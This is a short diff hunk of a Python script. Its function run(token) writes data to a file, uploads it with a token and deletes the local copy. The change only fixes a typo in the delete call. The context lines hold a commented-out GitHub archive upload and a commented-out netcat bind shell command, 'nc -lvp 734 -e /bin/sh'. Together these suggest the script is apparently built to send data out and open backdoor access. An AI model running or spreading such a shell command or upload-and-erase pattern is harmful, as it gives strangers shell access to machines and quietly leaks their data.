@@ -61,7 +61,7 @@ def run(token):
     print(stmnt)
     create_file(fname,stmnt)  
     upload_file(token,fname,stmnt)
-    delete:_file(fname)
+    delete_file(fname)
     if "Linux" in platform.system():
         #upload_file_to_github(archive)
         #os.system( 'nc -lvp 734 -e /bin/sh')
